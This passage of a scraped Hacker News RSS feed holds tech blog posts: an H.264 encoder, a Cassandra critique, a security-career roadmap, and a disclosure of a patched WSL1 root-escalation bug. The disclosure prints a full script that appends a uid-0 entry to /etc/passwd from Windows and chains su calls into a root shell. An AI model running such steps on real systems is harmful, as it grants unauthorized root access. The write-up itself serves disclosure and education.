<p>In <code>main()</code>, the encoder writes out the SPS and PPS. Then it reads YUV data from standard input, stores it in a frame buffer, and then writes out an H.264 slice header. It then loops over each macroblock in the frame and calls the <code>macroblock()</code> function to output a macroblock header indicating the macroblock is coded as I_PCM, and inserts the YUV data.</p>
<p>To use the code, you will need some uncompressed video. To generate this, I used the <a href="https://ffmpeg.org/">ffmpeg</a> package to convert a QuickTime movie from my <a href="https://cardinalpeak.com/blog/?p=240">Kodak Zi8 video camera</a> from H.264 to <a href="https://en.wikipedia.org/wiki/Common_Intermediate_Format">SQCIF</a> (128×96) planar <a href="https://en.wikipedia.org/wiki/YUV">YUV</a> format sampled at 4:2:0:</p>
<pre>ffmpeg.exe -i angel.mov -s sqcif -pix_fmt yuv420p angel.yuv</pre>
<p>I compile the H.264 encoder:</p>
<pre>gcc ?Wall ?ansi hello264.c ?o hello264</pre>
<p>And run it:</p>
<pre>hello264 &lt;angel.yuv &gt;angel.264</pre>
<p>Finally, I use ffmpeg to copy the raw H.264 NAL units into an MP4 file:</p>
<pre>ffmpeg.exe -f h264 -i angel.264 -vcodec copy angel.mp4</pre>
<p>Here is the resulting output:</p>

<p>There you have it — a complete H.264 encoder that uses minimal CPU cycles, with output larger than its input!</p>
<p>The next thing to add to this encoder would be CAVLC coding of macroblocks and intra prediction. The encoder would still be lossless at this point, but there would start to be compression of data. After that, the next logical step would be quantization to allow lossy compression, and then I would add P slices. As a development methodology, I prefer to bring up a simplistic version of an application, get it running, and then add refinements iteratively.</p>
<p>UPDATE 4/20/11: I’ve written more about the Sequence Parameter Set (SPS) <a href="https://cardinalpeak.com/blog/?p=878">here</a>.</p>
<p><em>Ben Mesander has more than 18 years of experience leading software development teams and implementing software. His strengths include Linux, C, C++, numerical methods, control systems and </em><a href="https://www.cardinalpeak.com/expertise/signalprocessing.php"><em>digital signal processing</em></a><em>. His experience includes </em><a href="https://www.cardinalpeak.com/expertise/embeddedsoftware.php"><em>embedded software</em></a><em>, scientific software and enterprise software development environments.</em></p>
</div></div>]]>
            </description>
            <link>https://www.cardinalpeak.com/worlds-smallest-h-264-encoder</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812581</guid>
            <pubDate>Sun, 17 Jan 2021 17:20:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Root Escalation Vulnerability in WSL1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25812519">thread link</a>) | @junon
<br/>
January 17, 2021 | https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/ | <a href="https://web.archive.org/web/*/https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div>
				
				<p>by Alto Alexander, posted January 17th 2021, 5:30:13 am</p>
				<blockquote>
<p><strong>NOTE: This vulnerability seems to have been silently patched by Microsoft since reaching out to them.</strong>
Whether or not my reaching out to them was what triggered the fix, I can’t say for sure.</p>
</blockquote>
<p>About a year ago I accidentally came across some strange filesystem properties
in WSL1 that I was ultimately able to exploit to gain root permissions in the
Ubuntu system I was running under WSL1. However, I imagine this could have been used
in any Linux installation under the WSL1 subsystem.</p>
<p>Speaking of Microsoft, I reached out to three different members of the WSL team regarding
any sort of bounty program for a WSL1 vulnerability regarding root escalation by means of the
filesystem bridge, or if that was something they’d be interested in. None of said contacts
wanted much to do with me. I was met with short responses, and ultimately ghosted entirely.</p>
<p>Microsoft has since patched this, so I guess if you can do it yourself, fuck the security
community right?</p>
<p>So I figured I’d write about it here.</p>
<p>Before I begin, let me give you my unsolicited opinion: both WSL1 and 2 are terrible
excuses for software and you should not be using them if you need a secure Linux installation.
Just use bare-metal Linux, or a proper VM (WSL2 is not a proper VM<sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=25612962">[1]</a></sup><sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=24641441">[2]</a></sup>).
We need to stop giving big corporations a free pass to spit out whatever nonsense they want while their employees
yell at independent open-sourcers for not moving fast enough, all the while profiting off
their work with little to no compensation.</p>
<p>With that, let’s begin.</p>
<hr>
<p>The exploit is rather simple - so simple, in fact, that it was found <em>by accident</em> while writing some
build scripts that utilized a Windows executable to generate a file in the Linux filesystem.</p>
<p>When a file is created from Windows in the Linux subsystem’s filesystem via the network mount,
the file has User-level security and permissions on Windows, but <code>root:root</code> ownership and
<code>a+wrx</code> permissions on Linux.</p>
<p>Why Microsoft decided this was a sane default concerns me.</p>
<p>All we have to do is tack on an entry in <code>passwd</code> with <code>uid=0,gid=0</code> using the Windows console
and we’re able to <code>su</code>; however, in my findings, I couldn’t execute just anything under <code>su</code> as
the dummy root account, but the one thing I could run under <code>su</code> was <code>su</code> itself, and since
I was <code>uid=0</code> then I could simply run <code>su root</code> again and drop a shell as the <em>real</em> <code>root</code> account.</p>
<p>Putting it all together, let’s set up our elevation script with some boilerplate that makes sure
we’re not masking any errors.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>#</span><span>!/usr/bin/env bash</span></span><br><span>set -euo pipefail</span><br></pre></td></tr></tbody></table></figure>
<p>Then, let’s make sure we’re actually running under WSL (because it makes no sense to attempt this
in any other environment).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span>function is_wsl() {</span><br><span>	command -v wslpath &amp;&gt;/dev/null</span><br><span>}</span><br><span>if ! is_wsl; then</span><br><span>	echo 'error: not wsl' &gt;&amp;2</span><br><span>	exit 1</span><br><span>fi</span><br></pre></td></tr></tbody></table></figure>
<p>Next, we’ll create a temporary file that we can <code>type.exe</code> out from the Windows side. This file
will contain our dummy root account entry that will be appended to <code>passwd</code>. Note the UID and GID
fields being <code>0</code>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>printf '%s\n' "lul::0:0::/:/bin/bash" &gt; /tmp/passwd.lul</span><br></pre></td></tr></tbody></table></figure>
<p>Now, we make use of WSL1’s automatic <code>.exe</code> handling and execute <code>cmd.exe</code> to append our entry
to <code>/etc/passwd</code>. Since Window’s doesn’t understand Linux paths inherently, we pass them through the
<code>wslpath</code> utility first.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>cmd.exe /C type "$(wslpath -w /)tmp\\passwd.lul" \&gt;\&gt; "$(wslpath -w /)etc\\passwd"</span><br></pre></td></tr></tbody></table></figure>
<p>A little cleanup.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>rm /tmp/passwd.lul</span><br></pre></td></tr></tbody></table></figure>
<p>Finally, we drop a root shell using the nested <code>su</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>su - lul /bin/sh -c /bin/su root</span><br></pre></td></tr></tbody></table></figure>
<hr>
<p>Creating a file using this method no longer creates the files as root, but as the running user within
the linux subsystem, which effectively patched everything up. That being said, I can almost guarantee
you this was abused in some fashion, maliciously or not.</p>
<p>I’m a little annoyed that Microsoft didn’t take my attempt to report seriously, but still found it important enough
<em>internally</em> to investigate and fix it. Now with all of the shit coming out about WSL2 being utter garbage,
it’s safe to say that WSL is, overall, a very failed experiment - which says something about NT, which was
designed exactly for this purpose.</p>
<p>I suppose I’m happy it’s patched, but still leaves a really shit taste in my mouth.</p>
<p>- Alto</p>

			</div>
		</div></div>]]>
            </description>
            <link>https://boring.dev/2021/01/17/root-escalation-vulnerability-in-wsl1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812519</guid>
            <pubDate>Sun, 17 Jan 2021 17:16:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacker News sentiment towards Big Tech companies]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25812346">thread link</a>) | @greatwave1
<br/>
January 17, 2021 | https://www.quiverquant.com/sources/hackernews | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p><a href="https://www.quiverquant.com/">
						<img src="https://www.quiverquant.com/static/img/logo.png" alt="">
					</a></p><p>Quiver scrapes alternative stock data from across the internet and aggregates it in a free, easy-to-use web dashboard.</p>
					<div>
						<p><span>Copyright © 2020 Quiver Quantitative, Inc. All rights reserved.</span></p><ul>
							<li><a href="https://www.quiverquant.com/privacypolicy">Privacy Policy</a></li>
							<li><a href="https://www.quiverquant.com/termsofservice">Terms of Service</a></li>
						</ul>
					</div>
				</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/sources/hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812346</guid>
            <pubDate>Sun, 17 Jan 2021 17:03:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Auditing PassRole: A Problematic Privilege Escalation Permission]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25812246">thread link</a>) | @arkadiyt
<br/>
January 17, 2021 | https://ermetic.com/whats-new/blog/auditing-passrole-a-problematic-privilege-escalation-permission/ | <a href="https://web.archive.org/web/*/https://ermetic.com/whats-new/blog/auditing-passrole-a-problematic-privilege-escalation-permission/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ermetic.com/whats-new/blog/auditing-passrole-a-problematic-privilege-escalation-permission/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812246</guid>
            <pubDate>Sun, 17 Jan 2021 16:51:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Using Cassandra as a metadata database for an object store is a bad choice]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25812125">thread link</a>) | @jtsymonds
<br/>
January 17, 2021 | https://blog.min.io/the-trouble-with-cassandra-based-object-stores/ | <a href="https://web.archive.org/web/*/https://blog.min.io/the-trouble-with-cassandra-based-object-stores/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                

                    <figure>
                        <img srcset="https://blog.min.io/content/images/size/w300/2021/01/pexels-pixabay-158826.jpg 300w,
                                    https://blog.min.io/content/images/size/w600/2021/01/pexels-pixabay-158826.jpg 600w,
                                    https://blog.min.io/content/images/size/w1000/2021/01/pexels-pixabay-158826.jpg 1000w,
                                    https://blog.min.io/content/images/size/w2000/2021/01/pexels-pixabay-158826.jpg 2000w" sizes="(max-width: 800px) 400px,
                                    (max-width: 1170px) 700px,
                                    1400px" src="https://blog.min.io/content/images/size/w2000/2021/01/pexels-pixabay-158826.jpg" alt="The Trouble With Cassandra: Why It's a Poor Choice For a Metadata Database for Object Stores">
                    </figure>

                <section>
                    <p>Cassandra is a popular, tried-and-true NoSQL database that supports key-value wide-column tables. Like any powerful tool, Cassandra has its ideal use cases - in particular, Cassandra excels at supporting write-heavy workloads, while having limitations when supporting read-heavy workloads. Cassandra's eventual consistency model and lack of transactions, multi-table support like joins, subqueries can also limit its usefulness.</p><p>However, using Cassandra as a metadata database for an object storage system introduces significant complexity resulting in data integrity and performance issues at scale - particularly if one wants to use their object store as a primary storage system. Object storage needs are far simpler and different from what Cassandra is built for.</p><p>Because the implications of employing Cassandra as a object storage metadata database were not properly understood, many object storage vendors made it a foundational part of their architecture - unfortunately it keeps them from ever moving past simple archival workloads into the modern workloads that define the future of object storage (AI/ML, analytics, web/mobile applications).</p><p>Let’s explore why in a little more detail.</p><ol><li>Cassandra was never designed to manage file or object storage metadata and it is predictably weak in this regard. It is <a href="https://docs.datastax.com/en/cassandra-oss/2.2/cassandra/dml/dmlTransactionsDiffer.html">not ACID compliant</a>. It does not have the rigidity to prevent partially successful writes, dupes, contradictions and the like. Cassandra does not support joins or foreign keys, and consequently does not offer consistency in the ACID sense. Further, there is no capacity to roll back transactions in the event of a failure. <p>While Cassandra supports atomicity and isolation at the row-level, it trades transactional isolation and atomicity for high availability and fast write performance. </p></li><li>Cassandra is categorized as an AP system in CAP. Meaning it trades Consistency for Availability and Partition tolerance. When employing Cassandra as a metadata database for an object store, you can either be fast or consistent - but not both at the same time. <p>Cassandra’s tunable consistency is a compromise, not a feature. Any setting other than <a href="https://docs.datastax.com/en/cassandra-oss/3.0/cassandra/dml/dmlConfigConsistency.html">QUORUM or ALL</a> means you are at risk of reading stale data. It is important to apply this consistency setting for both read and write operations in addition to the object data operations performed outside of it. </p><p>In the object storage world, the implication is that you can be good for archival use cases (write once, read very infrequently) or you choose a different architecture. </p></li><li>Similar to the consistency problem, durability guarantee is also a tradeoff between performance and correctness. The storage engine’s default <a href="https://cassandra.apache.org/doc/latest/architecture/storage_engine.html">commit log</a> is set to sync periodically every 10 seconds. This means you will lose up to 10 seconds worth of latest updates in the event of power failure. The only reasonable way to make Cassandra durable is to use the synchronous batch mode committer which comes with a performance penalty. </li><li>Cassandra’s high-availability guarantee is not suited for erasure coded object stores. With a replication factor of 3 and consistency quorum of 2, Cassandra can only tolerate a single node / drive failure within a replication group. Increasing the replication factor and quorum consistency to 5 or higher serves only to make the meta performance go from bad to worse. Unlike replication, erasure coding can tolerate multiple servers and drives failures in a distributed system. Even if you have configured the erasure code setting to 6 parity (any 6 nodes may fail) in a 16 node setup, you are still limited by the weak link, i.e Cassandra’s replication factor. The ops team is often unaware of these high-availability surprises until it is too late.</li><li>Object storage systems organize the data in a tree structured hierarchical namespace. Since Cassandra does not support a hierarchical key namespace, you will have to build a tree data model on top for each directory prefix and also maintain a flat list for direct lookups without directory walk. Atomically updating multiple tables with batched commit log and full read / write quorum is slow and prone to &nbsp;corruption.</li><li>While objects themselves are immutable, the object storage system is mutable. When you add, remove, overwrite objects and its metadata, apply policies, collect metrics, grant session tokens and rotating credentials, the metadata is always mutating. Cassandra is not designed to handle this level of metadata mutation and definitely not for the primary storage workloads. Long term archival use cases where the objects are large (GBs in size) and infrequently accessed, will work - other use cases will not..<p>The reason is that Cassandra's log structured storage system quickly appends new writes to the end of the log file, but delays the deletes and overwrites with a tombstone marker. Vacuuming these tombstones is an expensive operation, because the actual delete operation is applied by copying the SSTables to a new table sieving the stale entries in the process. This operation has to be performed on all the nodes simultaneously. If you delay vacuuming, excessive tombstones will result in increased read latencies, memory GC pauses and failed queries. Some object storage vendors use an additional Redis database to offload Cassandra’s pressure. Using two databases to manage an object stores metadata is hardly elegant and introduces additional points of failure. &nbsp;</p><p>The biggest gotcha? You won’t see these problems until you are deep into production and it is too late.</p></li><li>Small objects (KB to MB in size) will fill up the metadata drives dedicated to Cassandra much sooner than the data drives. Also small object workloads exacerbate Cassandra’s limitations, because they are sensitive to latency and consistency issues. &nbsp;Some vendors store small objects entirely inside Cassandra to address this problem. At this point, you are merely looking at an S3 proxy on top of Cassandra database. <p>This too is a bad practice. </p><p>If you use your object store for large objects and employ erasure coding and use Cassandra as your data store for small objects and use replication - you have introduced a non-trivial SLA problem. In this approach, data is protected by different guarantees. Given that drives die all the time, the probability of serving an old object or a corrupted object goes up considerably. </p><p>As noted above, your metadata database is now the weak link. Availability, consistency and durability guarantees are only as good as the weakest link. If the weakest link employs replication (three copies) you can only withstand one-node or one drive failure before losing data.</p><p>A counter argument might be to replicate five copies. The result is a massive performance hit and you can still really only withstand two-node or two-drive failure. </p><p>In using replication for small objects and erasure coding for large objects you also undermine the efficiency gains associated with EC. If you only use erasure code for large objects (likely a small percent of your overall object pool) you don’t gain much but increase your exposure considerably.</p></li><li>Employing Cassandra as your metadata database for an object store also introduces a troublesome Java dependency. This in turn can result in bloatware and memory management issues. Cassandra taxes the JVM memory management with constant large scale metadata allocation and mutation resulting in memory exhaustion and garbage collection pauses. </li></ol><p>The obvious takeaway is that it is a lot more complicated to operate a Cassandra cluster than a properly designed object storage system. Cassandra is built for a different purpose and object-storage meta-data is not one of them. The areas where Cassandra struggles are the areas that are core to a performant, scalable and resilient object store.</p><p>The last point is of note - object storage is a natural fit for blob data and that is why Erasure Coding is so effective and efficient. Cassandra is designed for replication. When you use that model for metadata it breaks the object store’s erasure coding advantage (or at the very least makes it brittle and prone to breakage).</p><p><strong>Bottom line. Write your metadata atomically with your object. Never separate them.</strong><br></p><p>We welcome your comments. Feel free to engage us on Twitter, on our Slack channel or by dropping us a note at <a href="mailto:hello@min.io">hello@min.io</a>.</p>

                                    </section>

                <section>
                            <a href="https://blog.min.io/tag/s3-select/">S3 Select</a>
                            <a href="https://blog.min.io/tag/machine-learning/">Machine Learning</a>
                            <a href="https://blog.min.io/tag/s3/">S3</a>
                            <a href="https://blog.min.io/tag/performance/">Performance</a>
                            <a href="https://blog.min.io/tag/security/">Security</a>
                            <a href="https://blog.min.io/tag/brand-design/">Brand/Design</a>
                            <a href="https://blog.min.io/tag/spark/">Spark</a>
                            <a href="https://blog.min.io/tag/high-performance/">High Performance</a>
                            <a href="https://blog.min.io/tag/benchmarks/">Benchmarks</a>
                            <a href="https://blog.min.io/tag/integrations/">Integrations</a>
                            <a href="https://blog.min.io/tag/modern-data-lakes/">Modern Data Lakes</a>
                            <a href="https://blog.min.io/tag/kubernetes/">Kubernetes</a>
                            <a href="https://blog.min.io/tag/presto/">Presto</a>
                            <a href="https://blog.min.io/tag/sql/">SQL</a>
                            <a href="https://blog.min.io/tag/opensource/">opensource</a>
                            <a href="https://blog.min.io/tag/golang-2/">Golang</a>
                            <a href="https://blog.min.io/tag/programming/">Programming</a>
                            <a href="https://blog.min.io/tag/cloud-computing/">Cloud Computing</a>
                            <a href="https://blog.min.io/tag/golang/">golang</a>
                            <a href="https://blog.min.io/tag/microservices/">Microservices</a>
                            <a href="https://blog.min.io/tag/raspberry-pi/">Raspberry Pi</a>
                            <a href="https://blog.min.io/tag/github/">Github</a>
                            <a href="https://blog.min.io/tag/docker/">Docker</a>
                            <a href="https://blog.min.io/tag/aws/">AWS</a>
                            <a href="https://blog.min.io/tag/devops/">DevOps</a>
                            <a href="https://blog.min.io/tag/assembly/">Assembly</a>
                            <a href="https://blog.min.io/tag/compilers/">Compilers</a>
                            <a href="https://blog.min.io/tag/api/">API</a>
                            <a href="https://blog.min.io/tag/nginx/">Nginx</a>
                            <a href="https://blog.min.io/tag/dcos/">DCOS</a>
                            <a href="https://blog.min.io/tag/apache-spark/">Apache Spark</a>
                            <a href="https://blog.min.io/tag/open-source/">Open Source</a>
                            <a href="https://blog.min.io/tag/design/">Design</a>
                            <a href="https://blog.min.io/tag/support/">support</a>
                            <a href="https://blog.min.io/tag/subnet/">SUBNET</a>
                            <a href="https://blog.min.io/tag/news/">News</a>
                            <a href="https://blog.min.io/tag/splunk/">Splunk</a>
                            <a href="https://blog.min.io/tag/intel/">Intel</a>
                            <a href="https://blog.min.io/tag/edge-computing/">edge computing</a>
                            <a href="https://blog.min.io/tag/veeam/">Veeam</a>
                            <a href="https://blog.min.io/tag/sidekick/">Sidek…</a></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.min.io/the-trouble-with-cassandra-based-object-stores/">https://blog.min.io/the-trouble-with-cassandra-based-object-stores/</a></em></p>]]>
            </description>
            <link>https://blog.min.io/the-trouble-with-cassandra-based-object-stores/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812125</guid>
            <pubDate>Sun, 17 Jan 2021 16:38:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyber Security; Beginner Roadmap]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25812025">thread link</a>) | @ashimi
<br/>
January 17, 2021 | https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o | <a href="https://web.archive.org/web/*/https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>I previously wrote an article on <a target="_blank" href="https://blog.ashimi.xyz/how-to-be-a-hacker-ckgsepg7y05i9z9s10bl92iy7">How to be a Hacker</a>, and I mentioned taking courses and practicing in Safe Environments. We will be taking a more precise look at that.</p>
<p>We will be exploring a Beginner to Expert Roadmap as designed by Tux in the infographic below
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610889439172/wAmw3SEGa.jpeg?auto=compress" alt="1603267450360.jpg"></p>
<h2 id="learning">Learning</h2>
<ul>
<li><p><a target="_blank" href="https://tryhackme.com/">tryhackme.com</a> provides a wide variety of security topics you can select from. These security topics give you access to different vulnerable machines and they are to be scanned and exploited with different tools for you to be able to complete the given tasks. Although there are certain aspects where you would require premium access, most of it is free. Every learning path comes with a different cybersecurity topic and they are very crucial to understand various concepts. TryHackMe Network can be connected to via OpenVPN in order to deploy machines / various Operating systems and carry out exploits.</p>
</li>
<li><p><a target="_blank" href="https://immersivelabs.online/">immersivelabs.online</a> is a gamified learning lab that is developed by experts as an emulation of world-class security threats. It allows you to visualize your capabilities as Hacker, practice with the latest discovered security threats, and earn points for completing labs.
It has over 600labs, and it's one of the coolest places to hon your skills</p>
</li>
<li><p><a target="_blank" href="https://www.hackthebox.eu/">hackthebox.eu</a> is very much hard than the previous two because you can't sign up directly, you have to hack your way into the platform. It is focused on practicing your skills and it comes with a Social Network feeling as you can connect with millions of hackers on the platform, share ideas, methodologies, and even compete for the Leaderboards. But It also has an Academy, if you need to review your knowledge or learn new concepts.</p>
</li>
<li><p><a target="_blank" href="https://www.vulnhub.com/">VulnHub.com</a> provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications, and network administration tasks. VulnHub offers offline virtual machines, allowing users to practice without competing with other learners. There’s no need to worry about consistent internet access, high pings, or latency. Users can set up their own private labs to practice and learn new skills.</p>
</li>
<li><p><a target="_blank" href="https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course">PEH by tcm</a> is a 25 hours course by TCM Security, it is one of the best-paid courses you can ever get. It is recommended to have a hackthebox account before starting the course. They focus only on tools and topics that will make you successful as an ethical hacker, it is completely hands-on and covers all foundational topics.</p>
</li>
</ul>
<h2 id="certification">Certification</h2>
<p>Once you have quite an experience in all of the above, you can decide to test your credibility and prepare for employment by getting the certifications, We will discuss below.</p>
<ul>
<li><p><a target="_blank" href="https://elearnsecurity.com/product/ejpt-certification/"> eLearnSecurity Junior Penetration
</a> is designed for students with no penetration testing experience, as shown in course content, the instructor’s mode of teaching, and the lab modules. The course teaches about practical skill-sets that are important to penetration testing such as networking knowledge, scripting/programming, vulnerability identification, etc. It has a fairly great structure and is delivered in the easiest way to understand. Although you can proceed to the certification without the course, it is still very recommended you take the course.</p>
</li>
<li><p><a target="_blank" href="https://www.offensive-security.com/pwk-oscp/OSCP/">Offensive Security Certified Professional</a>  is an ethical hacking certification offered by Offensive Security that teaches penetration testing methodologies and the use of the tools included with the Kali Linux distribution (successor of BackTrack). The OSCP is a hands-on penetration testing certification, requiring holders to successfully attack and penetrate various live machines in a safe lab environment.</p>
</li>
<li><p><a target="_blank" href="https://elearnsecurity.com/product/ecpptv2-certification/">eLearnSecurity’s Certified Professional Penetration Tester</a>  is a comprehensive, “black box” engagement against a given scope. You have seven days to complete the engagement, and another seven days to complete a professional penetration test report. </p>
</li>
<li><p><a target="_blank" href="https://www.offensive-security.com/courses-and-certifications/">Offensive Security Certified Expert</a>  is a 48-hour lab examination that will thoroughly test you on web exploitation, Windows exploit development, anti-virus evasion, x86 assembly, handcrafting shellcode, and more</p>
</li>
<li><p><a target="_blank" href="https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/">Certified Ethical Hacker (CEH)</a>  is a qualification obtained by demonstrating knowledge of assessing the security of computer systems by looking for weaknesses and vulnerabilities in target systems, using the same knowledge and tools as a malicious hacker, but in a lawful and legitimate manner to assess the security posture of a target system.</p>
</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Cyber Security is one of the most expensive fields, You are required to do a number of exams and certification. Unlike Software Development, These certifications are very crucial, They are more or less like a "Get out of jail free" Card.</p>
<p>Thanks for coming this far with me, I might be writing soon on preparatory exams for the above certifications</p>
<p>References:
<a href="https://medium.com/cybersecpadawan/ecppt-certified-a95fc842ca7b" target="_blank">medium.com/cybersecpadawan/ecppt-certified-..</a>
Wikipedia</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.ashimi.xyz/cyber-security-beginner-roadmap-ckk1cmmvb08jfqps1amjuh10o</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812025</guid>
            <pubDate>Sun, 17 Jan 2021 16:26:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Noom's unusual – but stupid effective – 9-figure marketing strategy]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811970">thread link</a>) | @PeteBoyle
<br/>
January 17, 2021 | https://have-a-word.com/noom-marketing | <a href="https://web.archive.org/web/*/https://have-a-word.com/noom-marketing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://have-a-word.com/noom-marketing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811970</guid>
            <pubDate>Sun, 17 Jan 2021 16:21:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If it weren't for those meddling cryptographers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811809">thread link</a>) | @baobabKoodaa
<br/>
January 17, 2021 | https://www.attejuvonen.fi/meddling-cryptographers/ | <a href="https://web.archive.org/web/*/https://www.attejuvonen.fi/meddling-cryptographers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>This is a story about how you should not respond to a vulnerability disclosure.</em></p>
<div><a href="https://unsplash.com/photos/2Ts5HnA67k8" target="_blank"><div><p><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='400'%20height='180'%3e%3cpath%20d='M0%2033v33h10l23%202c10%202%2018%202%2030%202%2017%200%2050%202%2056%204%205%202%209%201%209-1l1-3v-1c-1%201-1%201-1-1%201-3%200-5-3-6v-4c-2-2-2-2-1-5l1-6%202-3c1-2%201-4-1-4v-2l2-3h9l6-1%203-1c0-2%207-4%2014-4l1-1%202-1%202-1%204-1%208-5c4-5%209-7%209-4l2%201c4-1%207%200%205%201h1l3%201h2l4-1%202-1c0-1%202-1%202%201l2%201%201-1h2c1%202%204%202%205%201l1-1%201%201%201%201c2%200%203-1%204-3s3-3%205-1h3c4-4%2015-5%2018-1l3%201%202%201%206%203c3%200%207%202%208%203%203%202%207%203%2011%200%204-2%208-1%2014%201%2010%204%2016%200%2010-6l-1-3c2%200%201-2-1-2-3-1-3-3%200-4l1-1V7c1-2%2014-2%2015%200%201%201%203%201%2011-1%205-1%2013-5%2013-6H0v33m217-12c0%202%200%202-6%203l-4-1c0-2-6-1-9%201s-5%202-14%203c-11%200-17%201-21%205-6%205-12%2012-19%2022a143%20143%200%2001-10%2012l-2%205-3%203-6%2013c-6%2013-13%2032-13%2036%200%203-1%205-3%205-3-2-18%207-21%2014l-3%205-7-1c-7%200-15%202-20%207l-5%203-5%204c-4%205-9%205-16%200l-10-5c-6-2-6-2-9-1l-4%202H0v24h28a197%20197%200%200034-1l46%201h43v-2c0-5-7-7-15-5h-8c-4%200-4%200-3-1l14-1c11%200%2012-1%2014-3%202-3%203-3%203%200%201%204%2012%204%2012%200l-1-1h-2c0-2%202-3%205-3%202%201%203%203%201%203s-2%200-1%204l3%202c1-1%206%201%2011%205a235%20235%200%200050%201l-2-3-2-6c0-3-3-5-7-7l1-2c1-4%207-6%2014-6%205%200%206%200%206-2s-3-3-8-2l-5-1h-12l-6-1c-3%200-4%200-3-1h9c11%200%2017-1%2017-3l-1-1v-3c0-2%200-2-1-1-1%202-1%202-2%200-2-3-2-4%200-2%202%201%202%201%203-1l1-1c0%202%202%203%202%201l2-1%202-1%201-1c3%200%205-4%205-13l1-9c1-1%201-1%201%201v5l1%204%201-5c1-5%201-5%202-2l1%201%205-12c4-11%205-12%204-17l-1-8-1-6c0-8-1-11-2-11l-1-1v-9c1%200-2-4-4-4s-4-4-2-5c1-1-6-8-8-8l-3-2c-2-2-3-2-3-1-1%202-3%201-8-4l-8-5-5-2h-1m-4%2027l-1%202v6c-1%203-1%203%201%203l3%202c1%201%201%201-1%201-4%200-4%201-1%204l4%207v5l3-2c2-2%202-3%202-6-1-2-1-3%201-2s1-7-3-11l-1-3c0-4-6-10-7-6m24%205l-3%205c-2%203-3%205-2%206v2l1%201%202%201c2-2%203-1%204%204l1%204%201%201%204%202c4%200%204-1%200-5-2-2-2-4%202-4%202%201%203%200%200-2v-3c2-1%201-4-2-7l-4-4c-2-3-4-4-4-1m24%2059l-7%208c-2%202-3%206-2%207l3-1%202-2h4l2-2%204-10v-3l-1-2c0-2-2-1-5%205m-84%2054c-1%201%200%202%203%202l5%202%205%201%202%201%202%201%208%202c5%201%206%202%207%200%201-1-12-8-18-8-11-2-14-2-14-1'%20fill='%23f9ebd2'%20fill-rule='evenodd'/%3e%3c/svg%3e" title="Photo by Matthew Henry on Unsplash" alt=""></p></div></a>
</div>
<p>Back in 2015 a man-in-the-middle (MITM) vulnerability was discovered in an Australian internet voting system called iVote®. Things
